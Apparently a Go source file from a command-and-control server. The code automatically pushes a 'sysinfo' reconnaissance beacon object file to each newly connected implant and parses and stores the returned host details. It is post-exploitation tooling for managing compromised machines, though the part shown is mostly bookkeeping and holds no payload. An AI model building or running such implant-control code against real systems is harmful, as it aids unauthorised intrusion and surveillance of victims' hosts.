package main

// Sysinfo collector: auto-runs the `sysinfo` recon BOF on every newly connected
// implant, parses the KEY=VALUE output, persists it on the agent, and publishes
// a `sysinfo` event so the GUI refetches the (now-enriched) implant list.
//
// The BOF is fire-and-forget: the core sends it right after the implant
// connects, and the FIRST output/error event for that implant is consumed as
// the sysinfo result (intercepted in session.go::readLoop BEFORE the normal
// task-store feed, so it doesn't collide with operator-driven BOF tasks). A
// pending entry is held for at most `sysinfoTimeout` to avoid pinning the next
// output forever if the BOF silently fails.

import (
	"encoding/json"
	"strings"
	"sync"
	"time"
)

const sysinfoTimeout = 30 * time.Second

type SysinfoCollector struct {
	mu      sync.Mutex
	pending map[uint64]time.Time // implantID -> request time
}

func NewSysinfoCollector() *SysinfoCollector {
	return &SysinfoCollector{pending: map[uint64]time.Time{}}
}

// Request marks the implant as awaiting sysinfo and sends the sysinfo BOF.
// Best-effort: if the BOF isn't in the library or the send fails, the pending
// flag is still set so a stray early output is consumed harmlessly.
func (c *SysinfoCollector) Request(s *Session) {
	c.mu.Lock()
	c.pending[s.ID] = time.Now()
	c.mu.Unlock()

	go func() {
		b64, err := boflib.Resolve("sysinfo")
		if err != nil {
			// No sysinfo BOF staged — clear pending so we don't swallow the
			// next operator output. The GUI just won't show recon fields.
			c.mu.Lock()
			delete(c.pending, s.ID)
			c.mu.Unlock()
			return
		}
		_ = s.Send(serverMsg{Type: "bof", File: b64, Args: ""})
	}()
}

// Pending reports whether the next output/error for this implant is the
// expected sysinfo result (and is still within the timeout window).
func (c *SysinfoCollector) Pending(id uint64) bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	t, ok := c.pending[id]
	if !ok {
		return false
	}
	if time.Since(t) > sysinfoTimeout {
		delete(c.pending, id)
		return false
	}
	return true
}

// Clear drops the pending marker (call after consuming or giving up).
func (c *SysinfoCollector) Clear(id uint64) {
	c.mu.Lock()
	delete(c.pending, id)
	c.mu.Unlock()
}

// parseSysinfo turns the BOF's KEY=VALUE text into a field map.
func parseSysinfo(data string) map[string]string {
	out := map[string]string{}
	for _, line := range strings.Split(data, "\n") {
		line = strings.TrimRight(line, "\r")
		if line == "" || strings.HasPrefix(line, "[") {
			continue
		}
		eq := strings.IndexByte(line, '=')
		if eq <= 0 {
			continue
		}
		k := strings.TrimSpace(line[:eq])
		v := strings.TrimSpace(line[eq+1:])
		if k != "" {
			out[k] = v
		}
	}
	return out
}

// fieldsJSON renders the field map as JSON for the `sysinfo` event payload.
func fieldsJSON(fields map[string]string) string {
	b, _ := json.Marshal(fields)
	return string(b)
}
